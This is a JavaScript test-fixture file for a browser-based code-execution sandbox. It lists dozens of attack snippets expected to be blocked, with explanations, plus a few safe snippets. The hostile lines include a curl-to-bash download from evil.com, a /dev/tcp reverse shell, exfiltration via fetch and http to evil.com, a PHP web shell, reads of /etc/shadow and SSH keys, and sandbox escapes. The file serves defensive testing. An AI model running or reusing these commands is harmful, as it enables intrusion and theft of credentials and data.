/**
 * JavaScript Security Attack Vectors
 * 
 * Educational test cases demonstrating common attack patterns
 * that malicious users might attempt in a web-based code execution environment.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const javascriptTests = [
  // ════════════════════════════════════════════════════════════════
  // COMMAND EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: child_process require',
    code: `const { exec } = require('child_process'); exec('whoami', (err, stdout) => console.log(stdout));`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Shell Command Execution via child_process
      
      How hackers use this:
      Attackers import Node.js's child_process module to execute arbitrary shell commands
      on the server. This is the most direct way to achieve Remote Code Execution (RCE).
      
      Real-world impact:
      - Execute 'rm -rf /' to delete all server files
      - Run 'cat /etc/passwd' to steal user credentials
      - Install backdoors, cryptocurrency miners, or ransomware
      - Pivot to attack other systems on the network
      
      Example attack chain:
      1. exec('curl http://evil.com/backdoor.sh | bash')
      2. Server downloads and executes attacker's script
      3. Attacker gains persistent access to the server
    `,
  },
  {
    name: 'JS: child_process import',
    code: `import { exec } from 'child_process'; exec('ls -la');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: ES Module Import of child_process
      
      How hackers use this:
      Same as require(), but using modern ES module syntax. Attackers try both
      CommonJS (require) and ESM (import) to bypass filters that only check one style.
      
      Real-world impact:
      - List all files to find sensitive configuration
      - Map the server's directory structure for further attacks
      - Identify installed software and versions for targeted exploits
    `,
  },
  {
    name: 'JS: spawn command',
    code: `import { spawn } from 'child_process'; spawn('cat', ['/etc/passwd']);`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Process Spawning with Arguments
      
      How hackers use this:
      spawn() allows passing command arguments as an array, which can bypass
      filters looking for command strings. It's also better for long-running processes.
      
      Real-world impact:
      - Spawn reverse shells: spawn('bash', ['-c', 'bash -i >& /dev/tcp/evil.com/4444 0>&1'])
      - Run background processes that persist after the main script ends
      - Execute binaries with complex argument combinations
    `,
  },
  {
    name: 'JS: execSync command',
    code: `const { execSync } = require('child_process'); console.log(execSync('id').toString());`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Synchronous Command Execution
      
      How hackers use this:
      execSync() blocks until the command completes and returns the output directly.
      This makes it easy to extract data in a single expression.
      
      Real-world impact:
      - Exfiltrate data: execSync('cat /etc/shadow').toString()
      - Check user privileges: execSync('id') shows if running as root
      - More reliable than async when attacker needs immediate results
    `,
  },
  {
    name: 'JS: execFile command',
    code: `import { execFile } from 'child_process'; execFile('/bin/ls', ['-la'], (e, out) => console.log(out));`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Direct Binary Execution
      
      How hackers use this:
      execFile() runs a specific binary without going through a shell.
      This can bypass shell-based security measures and is harder to detect.
      
      Real-world impact:
      - Execute compiled malware directly
      - Run system utilities without shell logging
      - Avoid shell escaping issues for reliable exploitation
    `,
  },
  {
    name: 'JS: fork process',
    code: `import { fork } from 'child_process'; fork('./malicious.js');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Forking Node.js Processes
      
      How hackers use this:
      fork() creates a new Node.js process that can communicate with the parent.
      Attackers use this to run persistent background malware.
      
      Real-world impact:
      - Run cryptocurrency miners in forked processes
      - Create process networks for distributed attacks
      - Maintain persistence even if main process is killed
    `,
  },
  {
    name: 'JS: Dynamic require bypass',
    code: `const m = 'child_' + 'process'; const cp = require(m); cp.exec('whoami');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: String Concatenation Filter Bypass
      
      How hackers use this:
      By splitting dangerous module names into pieces, attackers try to evade
      pattern-based security filters that look for exact strings.
      
      Real-world impact:
      - Bypass simple regex filters: 'child' + '_process' !== 'child_process' to naive filters
      - This is why we block ALL dynamic requires, not just specific module names
      - Forces security to think about semantic analysis, not just string matching
    `,
  },
  {
    name: 'JS: String concatenation bypass',
    code: `const name = ['child', '_', 'process'].join(''); require(name).exec('id');`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Array Join Filter Bypass
      
      How hackers use this:
      Using array operations to construct module names at runtime,
      making static analysis nearly impossible.
      
      Real-world impact:
      - More sophisticated than simple concatenation
      - Can be combined with encoding to further obfuscate
      - Demonstrates why allowlisting is better than blocklisting
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: fs module import',
    code: `import * as fs from 'fs'; console.log(fs.readFileSync('/etc/passwd', 'utf8'));`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File System Access via fs Module
      
      How hackers use this:
      The fs module provides complete filesystem access. Attackers use it to
      read sensitive files, write malware, or modify configurations.
      
      Real-world impact:
      - Read /etc/passwd, /etc/shadow for credential theft
      - Read .env files containing API keys and database passwords
      - Modify application code to inject backdoors
      - Read private SSH keys for lateral movement
    `,
  },
  {
    name: 'JS: fs/promises import',
    code: `import { readFile } from 'fs/promises'; const data = await readFile('/etc/passwd');`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Promise-based File Access
      
      How hackers use this:
      fs/promises is the modern async API for file operations. Attackers use it
      when await/async is available, which is common in modern Node.js.
      
      Real-world impact:
      - Same as fs, but with cleaner async code
      - Often overlooked by filters that only check 'fs'
      - Part of comprehensive fs blocking strategy
    `,
  },
  {
    name: 'JS: fs writeFile',
    code: `import { writeFileSync } from 'fs'; writeFileSync('/tmp/backdoor.js', 'malicious code');`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Writing Malicious Files
      
      How hackers use this:
      Writing files allows persistent attacks - malware that survives restarts,
      web shells for continued access, or configuration changes.
      
      Real-world impact:
      - Write web shells: writeFileSync('/var/www/shell.php', '<?php system($_GET["cmd"]); ?>')
      - Modify cron jobs for persistence
      - Overwrite legitimate code with trojaned versions
      - Create SSH authorized_keys for backdoor access
    `,
  },
  {
    name: 'JS: fs require',
    code: `const fs = require('fs'); fs.readdirSync('/').forEach(f => console.log(f));`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Directory Enumeration
      
      How hackers use this:
      Listing directories helps attackers understand the system structure,
      find sensitive files, and plan further attacks.
      
      Real-world impact:
      - Map application structure to find config files
      - Discover backup files with credentials
      - Find log files with sensitive information
      - Locate other users' home directories
    `,
  },
  {
    name: 'JS: node:fs import',
    code: `import fs from 'node:fs'; fs.readFileSync('/root/.ssh/id_rsa');`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Node.js Protocol Import Bypass
      
      How hackers use this:
      The 'node:' prefix is an alternative way to import built-in modules.
      Attackers try this when regular imports are blocked.
      
      Real-world impact:
      - Steal SSH private keys for server access
      - Same capabilities as regular fs, different import path
      - Tests thoroughness of import blocking
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: http module',
    code: `const http = require('http'); http.get('http://evil.com/steal?data=secret');`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Data Exfiltration via HTTP
      
      How hackers use this:
      Network access allows attackers to send stolen data to external servers
      or download additional malware payloads.
      
      Real-world impact:
      - Exfiltrate stolen credentials, tokens, or sensitive data
      - Download second-stage malware
      - Connect to Command & Control (C2) servers
      - Launch attacks against other systems
    `,
  },
  {
    name: 'JS: https module',
    code: `const https = require('https'); https.get('https://evil.com/beacon');`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Encrypted Data Exfiltration
      
      How hackers use this:
      HTTPS makes exfiltration harder to detect because the traffic is encrypted.
      Security tools can't inspect the content without SSL interception.
      
      Real-world impact:
      - Evade network-level security monitoring
      - Appear as legitimate HTTPS traffic
      - Harder to distinguish from normal API calls
    `,
  },
  {
    name: 'JS: net module',
    code: `const net = require('net'); net.connect(4444, 'evil.com');`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Raw TCP Connection (Reverse Shell)
      
      How hackers use this:
      The net module provides raw socket access, commonly used to create
      reverse shells that connect back to attacker-controlled servers.
      
      Real-world impact:
      - Establish reverse shells for interactive access
      - Bypass firewalls that only filter inbound connections
      - Create covert channels for data exfiltration
      - Port scanning and network reconnaissance
    `,
  },
  {
    name: 'JS: dgram (UDP)',
    code: `const dgram = require('dgram'); const s = dgram.createSocket('udp4');`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: UDP-based Communication
      
      How hackers use this:
      UDP can bypass some firewalls and monitoring that focus on TCP.
      It's used for DNS exfiltration and covert channels.
      
      Real-world impact:
      - DNS tunneling to exfiltrate data
      - Participate in DDoS amplification attacks
      - Covert communication that evades TCP monitoring
    `,
  },
  {
    name: 'JS: fetch API',
    code: `fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(secrets) });`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Modern HTTP Data Exfiltration
      
      How hackers use this:
      fetch() is the modern way to make HTTP requests. Attackers use it to
      send stolen data to external servers with minimal code.
      
      Real-world impact:
      - Send JSON payloads of stolen data
      - Make API calls to attacker infrastructure
      - Cleaner syntax than http module, often overlooked
    `,
  },
  {
    name: 'JS: WebSocket',
    code: `const ws = new WebSocket('wss://evil.com/shell'); ws.onopen = () => ws.send('connected');`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Persistent WebSocket Connection
      
      How hackers use this:
      WebSockets provide bidirectional, persistent connections - perfect for
      interactive remote shells and real-time data streaming.
      
      Real-world impact:
      - Interactive reverse shells with low latency
      - Real-time exfiltration of keystrokes/data
      - Persistent connection that survives page reloads
      - Harder to detect than repeated HTTP requests
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: process.env access',
    code: `console.log(process.env);`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Environment Variable Theft
      
      How hackers use this:
      Environment variables often contain sensitive configuration like
      API keys, database passwords, and secret tokens.
      
      Real-world impact:
      - Steal AWS_SECRET_ACCESS_KEY for cloud account takeover
      - Get DATABASE_URL with credentials
      - Find JWT_SECRET to forge authentication tokens
      - Access STRIPE_SECRET_KEY for financial fraud
    `,
  },
  {
    name: 'JS: process.exit',
    code: `process.exit(1);`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Denial of Service (DoS)
      
      How hackers use this:
      Terminating the process causes service disruption. In a shared
      environment, this affects all users.
      
      Real-world impact:
      - Crash the server, causing downtime
      - Disrupt service for legitimate users
      - Part of extortion/ransom attacks
      - Cover tracks by crashing before logging
    `,
  },
  {
    name: 'JS: process.kill',
    code: `process.kill(process.pid, 'SIGKILL');`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Process Termination
      
      How hackers use this:
      Sending signals to processes can terminate them or alter their behavior.
      SIGKILL cannot be caught or ignored.
      
      Real-world impact:
      - Kill the application process
      - Kill other processes on the system (if permissions allow)
      - Disrupt related services
    `,
  },
  {
    name: 'JS: process.cwd',
    code: `console.log(process.cwd());`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Path Disclosure
      
      How hackers use this:
      Knowing the current working directory helps attackers understand
      the application structure and plan path traversal attacks.
      
      Real-world impact:
      - Reveals server file structure
      - Helps construct path traversal attacks
      - Information gathering for targeted exploits
    `,
  },
  {
    name: 'JS: os module',
    code: `const os = require('os'); console.log(os.hostname(), os.userInfo());`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: System Information Gathering
      
      How hackers use this:
      The os module reveals system details useful for fingerprinting
      and planning targeted attacks.
      
      Real-world impact:
      - Get hostname for network mapping
      - Find username running the process
      - Detect OS version for targeted exploits
      - Measure available memory for resource attacks
    `,
  },
  {
    name: 'JS: cluster module',
    code: `const cluster = require('cluster'); if (cluster.isMaster) cluster.fork();`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Process Multiplication (Fork Bomb)
      
      How hackers use this:
      The cluster module can spawn multiple processes, potentially
      creating a fork bomb that exhausts system resources.
      
      Real-world impact:
      - Denial of Service through resource exhaustion
      - Crash the entire server
      - Affect other applications on shared hosting
    `,
  },
  {
    name: 'JS: worker_threads',
    code: `const { Worker } = require('worker_threads'); new Worker('./evil.js');`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Background Thread Execution
      
      How hackers use this:
      Worker threads run in parallel and can execute malicious code
      independently of the main thread.
      
      Real-world impact:
      - Run CPU-intensive attacks (cryptomining)
      - Execute code that survives main thread termination
      - Parallel processing for faster data theft
    `,
  },
  {
    name: 'JS: vm module',
    code: `const vm = require('vm'); vm.runInNewContext('process.exit()');`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: VM Sandbox Escape
      
      How hackers use this:
      The vm module creates "sandboxed" contexts, but they're not secure.
      Attackers can escape to access the main context.
      
      Real-world impact:
      - Bypass intended sandboxing
      - Access global objects from "isolated" context
      - Execute arbitrary code with full privileges
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CODE INJECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: eval execution',
    code: `eval("require('child_process').exec('whoami')");`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Dynamic Code Execution via eval()
      
      How hackers use this:
      eval() executes arbitrary JavaScript strings. Attackers use it to
      construct and run malicious code dynamically.
      
      Real-world impact:
      - Execute obfuscated malicious code
      - Bypass static code analysis
      - Combine with encoding to evade detection
      - The classic "eval is evil" security issue
    `,
  },
  {
    name: 'JS: Function constructor',
    code: `const fn = new Function("return require('fs').readFileSync('/etc/passwd')"); fn();`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Code Generation via Function Constructor
      
      How hackers use this:
      The Function constructor is eval() in disguise. It creates new functions
      from strings, allowing dynamic code execution.
      
      Real-world impact:
      - Often missed by filters that only block eval()
      - Can construct and execute any JavaScript
      - Bypass CSP that blocks eval but not Function
    `,
  },
  {
    name: 'JS: Dynamic import',
    code: `const module = await import('child_' + 'process'); module.exec('whoami');`,
    expectBlocked: true,
    category: 'code_injection',
    explanation: `
      🎯 ATTACK: Runtime Module Loading
      
      How hackers use this:
      Dynamic import() allows loading modules at runtime with computed names,
      bypassing static analysis and import restrictions.
      
      Real-world impact:
      - Load dangerous modules with obfuscated names
      - Conditional loading to evade detection
      - Import from external URLs (in some environments)
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // MEMORY/BUFFER ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Buffer.allocUnsafe',
    code: `const buf = Buffer.allocUnsafe(1000); console.log(buf.toString());`,
    expectBlocked: true,
    category: 'memory_access',
    explanation: `
      🎯 ATTACK: Memory Information Disclosure
      
      How hackers use this:
      Buffer.allocUnsafe() doesn't initialize memory, potentially exposing
      data from previous allocations (passwords, keys, etc.).
      
      Real-world impact:
      - Read sensitive data from uninitialized memory
      - Heartbleed-style information disclosure
      - Extract cryptographic keys or passwords
      - Memory forensics without direct access
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ENCODING BYPASS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: String.fromCharCode bypass',
    code: `const cmd = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115); require(cmd);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Character Code Obfuscation
      
      How hackers use this:
      Converting strings to/from character codes hides malicious module names
      from pattern-based filters.
      
      Real-world impact:
      - 'child_process' as char codes: 99,104,105,108,100,95...
      - Bypasses simple string matching
      - Common in malware and exploit kits
      - Why we block the encoding functions themselves
    `,
  },
  {
    name: 'JS: atob base64 bypass',
    code: `const mod = atob('Y2hpbGRfcHJvY2Vzcw=='); require(mod).exec('id');`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Base64 Encoded Payload
      
      How hackers use this:
      Base64 encoding is widely used to hide malicious strings.
      'Y2hpbGRfcHJvY2Vzcw==' decodes to 'child_process'.
      
      Real-world impact:
      - Hide malicious code in seemingly random strings
      - Bypass WAFs and pattern filters
      - Standard technique in web exploitation
      - Often combined with other encoding layers
    `,
  },
  {
    name: 'JS: Buffer.from decode bypass',
    code: `const mod = Buffer.from('6368696c645f70726f63657373', 'hex').toString(); require(mod);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Hex Encoded Module Name
      
      How hackers use this:
      Hex encoding converts strings to hexadecimal, evading string-based filters.
      '6368696c645f70726f63657373' = 'child_process' in hex.
      
      Real-world impact:
      - Alternative to base64 for obfuscation
      - Can bypass filters that block base64 but not hex
      - Common in exploit development
    `,
  },
  {
    name: 'JS: Unicode escape bypass',
    code: `const p = '\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073'; console.log(global[p].env);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Unicode Escape Sequence
      
      How hackers use this:
      JavaScript supports unicode escapes in strings. '\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073'
      is 'process' - used to access global.process.env.
      
      Real-world impact:
      - Bypass keyword filters
      - Access blocked properties via bracket notation
      - Valid JavaScript that looks like garbage
    `,
  },
  {
    name: 'JS: Hex escape bypass',
    code: `const x = '\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'; console.log(global[x].env);`,
    expectBlocked: true,
    category: 'encoding_bypass',
    explanation: `
      🎯 ATTACK: Hex Character Escapes
      
      How hackers use this:
      Similar to unicode escapes, hex escapes hide string content.
      '\\x70\\x72\\x6f\\x63\\x65\\x73\\x73' = 'process'.
      
      Real-world impact:
      - Shorter than unicode escapes
      - Equally effective at bypassing filters
      - Common in JavaScript obfuscators
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // PROTOTYPE POLLUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: __proto__ pollution',
    code: `({}).__proto__.polluted = 'pwned'; console.log({}.polluted);`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `
      🎯 ATTACK: Prototype Pollution via __proto__
      
      How hackers use this:
      Modifying Object.prototype affects ALL objects in the application.
      This can lead to privilege escalation, RCE, or DoS.
      
      Real-world impact:
      - Add malicious properties to all objects
      - Bypass security checks: if(obj.isAdmin) becomes true for all
      - Can lead to RCE in certain frameworks
      - CVE-2019-11358 (jQuery), CVE-2020-8203 (Lodash)
    `,
  },
  {
    name: 'JS: Object.setPrototypeOf pollution',
    code: `Object.setPrototypeOf({}, { exec: () => 'pwned' });`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `
      🎯 ATTACK: Prototype Manipulation via setPrototypeOf
      
      How hackers use this:
      setPrototypeOf can change an object's prototype chain, injecting
      malicious methods that appear to be inherited.
      
      Real-world impact:
      - Inject malicious methods into objects
      - Modify behavior of built-in types
      - Bypass instanceof checks
    `,
  },
  {
    name: 'JS: constructor.prototype pollution',
    code: `const obj = {}; obj.constructor.prototype.polluted = true;`,
    expectBlocked: true,
    category: 'prototype_pollution',
    explanation: `
      🎯 ATTACK: Prototype Pollution via constructor
      
      How hackers use this:
      Accessing prototype through constructor is another pollution vector
      that may bypass filters checking only for __proto__.
      
      Real-world impact:
      - Alternative path to prototype pollution
      - Affects all objects sharing that prototype
      - Can corrupt application state globally
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // GLOBAL OBJECT ACCESS ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: globalThis access',
    code: `console.log(globalThis.process.env);`,
    expectBlocked: true,
    category: 'global_access',
    explanation: `
      🎯 ATTACK: globalThis Environment Access
      
      How hackers use this:
      globalThis is the standard way to access the global object in any
      JavaScript environment. It provides access to process in Node.js.
      
      Real-world impact:
      - Access process.env for credential theft
      - Reach any global object or function
      - Works in both browser and Node.js
    `,
  },
  {
    name: 'JS: global access',
    code: `console.log(global.process.mainModule.require('child_process'));`,
    expectBlocked: true,
    category: 'global_access',
    explanation: `
      🎯 ATTACK: Node.js Global Object Chain
      
      How hackers use this:
      The global object chain (global.process.mainModule.require) can be
      used to access require() even when it's not directly available.
      
      Real-world impact:
      - Bypass sandboxes that hide require()
      - Access dangerous modules through the prototype chain
      - Classic VM escape technique
    `,
  },
  {
    name: 'JS: this.constructor escape',
    code: `const p = this.constructor.constructor('return process')(); console.log(p.env);`,
    expectBlocked: true,
    category: 'global_access',
    explanation: `
      🎯 ATTACK: Constructor Chain Sandbox Escape
      
      How hackers use this:
      this.constructor.constructor is the Function constructor. It can
      create functions that return global objects, escaping sandboxes.
      
      Real-world impact:
      - Escape vm2, safeeval, and similar sandboxes
      - Access process even in "restricted" contexts
      - Well-known technique in CTF competitions
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // REFLECT/PROXY ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Reflect.get bypass',
    code: `const p = Reflect.get(global, 'process'); console.log(p.env);`,
    expectBlocked: true,
    category: 'reflect_proxy',
    explanation: `
      🎯 ATTACK: Reflection-based Property Access
      
      How hackers use this:
      Reflect API provides an alternative way to access object properties
      that may bypass property access hooks.
      
      Real-world impact:
      - Bypass proxy-based sandboxes
      - Access properties through reflection
      - Alternative to direct property access
    `,
  },
  {
    name: 'JS: Proxy trap',
    code: `new Proxy({}, { get: () => require('fs') });`,
    expectBlocked: true,
    category: 'reflect_proxy',
    explanation: `
      🎯 ATTACK: Proxy Trap for Code Execution
      
      How hackers use this:
      Proxies can intercept property access and execute arbitrary code.
      The handler functions can contain malicious payloads.
      
      Real-world impact:
      - Execute code when properties are accessed
      - Hide malicious behavior in proxy handlers
      - Create objects with dangerous side effects
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // TIMER ABUSE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: setTimeout eval',
    code: `setTimeout("require('child_process').exec('id')", 0);`,
    expectBlocked: true,
    category: 'timer_abuse',
    explanation: `
      🎯 ATTACK: Delayed Code Execution via setTimeout
      
      How hackers use this:
      setTimeout with a string argument acts like eval(), executing
      the string as code after a delay.
      
      Real-world impact:
      - Delayed execution to evade real-time monitoring
      - Execute code after security checks complete
      - Legacy eval equivalent that's often overlooked
    `,
  },
  {
    name: 'JS: setInterval abuse',
    code: `setInterval(() => { throw new Error('DoS'); }, 1);`,
    expectBlocked: true,
    category: 'timer_abuse',
    explanation: `
      🎯 ATTACK: Interval-based Denial of Service
      
      How hackers use this:
      Rapid setInterval calls can exhaust resources or cause continuous
      errors that disrupt normal operation.
      
      Real-world impact:
      - Resource exhaustion through rapid callbacks
      - Continuous error generation
      - Event loop saturation
    `,
  },
  {
    name: 'JS: setImmediate abuse',
    code: `setImmediate(() => require('child_process').exec('id'));`,
    expectBlocked: true,
    category: 'timer_abuse',
    explanation: `
      🎯 ATTACK: Immediate Callback Execution
      
      How hackers use this:
      setImmediate schedules callbacks to run as soon as possible,
      potentially executing malicious code before cleanup.
      
      Real-world impact:
      - Execute before synchronous code completes
      - Race condition exploitation
      - Queue flooding for DoS
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // ASYNC EXPLOIT ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Promise.resolve exec',
    code: `Promise.resolve().then(() => require('child_process').exec('id'));`,
    expectBlocked: true,
    category: 'async_exploits',
    explanation: `
      🎯 ATTACK: Promise-based Deferred Execution
      
      How hackers use this:
      Promises allow deferred execution that may bypass synchronous
      security checks or auditing.
      
      Real-world impact:
      - Execute after current call stack completes
      - Evade synchronous monitoring
      - Chain multiple malicious operations
    `,
  },
  {
    name: 'JS: queueMicrotask',
    code: `queueMicrotask(() => require('fs').readFileSync('/etc/passwd'));`,
    expectBlocked: true,
    category: 'async_exploits',
    explanation: `
      🎯 ATTACK: Microtask Queue Injection
      
      How hackers use this:
      queueMicrotask schedules code before other async callbacks,
      potentially executing before cleanup or security checks.
      
      Real-world impact:
      - Higher priority than setTimeout callbacks
      - Execute before promise handlers in queue
      - Subtle timing-based attacks
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // DANGEROUS MODULE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: crypto module',
    code: `const crypto = require('crypto'); console.log(crypto.randomBytes(16));`,
    expectBlocked: true,
    category: 'dangerous_modules',
    explanation: `
      🎯 ATTACK: Cryptographic Operations
      
      How hackers use this:
      While crypto itself isn't directly dangerous, it can be used to
      generate keys for malware, encrypt stolen data, or for crypto mining.
      
      Real-world impact:
      - Generate encryption keys for ransomware
      - Create secure channels for data exfiltration
      - Cryptocurrency mining operations
    `,
  },
  {
    name: 'JS: stream module',
    code: `const stream = require('stream'); new stream.Readable();`,
    expectBlocked: true,
    category: 'dangerous_modules',
    explanation: `
      🎯 ATTACK: Stream-based Data Processing
      
      How hackers use this:
      Streams can be used to process large amounts of data efficiently,
      useful for exfiltration or processing malicious payloads.
      
      Real-world impact:
      - Stream large files for exfiltration
      - Process binary payloads
      - Create pipes between processes
    `,
  },
  {
    name: 'JS: zlib module',
    code: `const zlib = require('zlib'); zlib.gzipSync('data');`,
    expectBlocked: true,
    category: 'dangerous_modules',
    explanation: `
      🎯 ATTACK: Compression for Evasion
      
      How hackers use this:
      Compression can be used to hide malicious payloads, reduce
      exfiltration bandwidth, or trigger decompression bombs.
      
      Real-world impact:
      - Compress data to evade size-based detection
      - Decompression bombs (zip bombs) for DoS
      - Hide malicious code in compressed archives
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE (should execute successfully)
  // ════════════════════════════════════════════════════════════════
  {
    name: 'JS: Safe console.log',
    code: `console.log('Hello, World!');`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Basic Console Output
      
      This is legitimate code that should execute:
      Simple console output is the foundation of learning to code
      and debugging. No security risk.
    `,
  },
  {
    name: 'JS: Safe math',
    code: `console.log(2 + 2);`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Mathematical Operations
      
      This is legitimate code that should execute:
      Basic arithmetic operations are fundamental to programming
      and pose no security risk.
    `,
  },
  {
    name: 'JS: Safe array operations',
    code: `const arr = [1,2,3].map(x => x * 2); console.log(arr.join(','));`,
    expectBlocked: false,
    expectedOutput: '2,4,6',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Array Methods
      
      This is legitimate code that should execute:
      Array manipulation methods like map, filter, and join are
      essential for data processing.
    `,
  },
  {
    name: 'JS: Safe async/await',
    code: `const delay = ms => new Promise(r => setTimeout(r, ms)); await delay(10); console.log('done');`,
    expectBlocked: false,
    expectedOutput: 'done',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Async/Await Patterns
      
      This is legitimate code that should execute:
      Promise-based async code with short delays is common and safe.
      Teaching async patterns is important.
    `,
  },
];
